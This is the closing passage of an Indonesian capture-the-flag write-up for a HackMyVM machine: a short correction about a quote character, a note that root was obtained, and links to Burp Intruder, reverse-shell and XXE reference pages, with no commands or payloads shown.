<p>itu bukan double quote, harusnya pake single quote salah screenshot saya. menggunakan ini <strong>‘</strong>.</p>

<p><img src="https://i.ibb.co/QD4Pg6z/image.png" alt="kontoldon" /></p>

<p>and boom, we got the root.</p>
<h2 id="referensi">Referensi</h2>

<ul>
  <li><a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-results">https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-results</a></li>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></li>
  <li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file</a></li>
</ul>

  </div>
  <div class="post-info" style="padding-top: 25px">
    <div class="post-date">
      2022-05-16.
    </div>
    <div class="post-categories">
      <span></span>
      
      <a href="/category/hackmyvm" class="post-category">hackmyvm</a>
      
    </div>
    <div class="post-tags">
      <span></span>
      
      <a href="/tag/xxe" class="post-tag">XXE</a>
      
      <a href="/tag/fuzzing" class="post-tag">fuzzing</a>
      
      <a href="/tag/lfi" class="post-tag">LFI</a>
      
      <a href="/tag/burp-intruder" class="post-tag">burp-intruder</a>
      
    </div>
    <div class="post-tools">
      
      <div>
        <span></span><a href="/hmv-discover">HackMyVM: Discover</a>
      </div>
      
      
      <div>
        <span></span><a href="/htb-late">HackTheBox: Late</a>
      </div>
      
    </div>
    
  </div>
</article>

    </main>
    <footer class="container-footer">
      <div class="footer-copyright">
  <span class="footer-copyright-text float-left">Copyright &copy; 2022.  sharpicx.</span>
  <span class="footer-copyright-text float-right">
    Powered by <a href="https://jekyllrb.com/">Jekyll</a>
  </span>
</div>

    </footer>
  </div>
</body>
</html>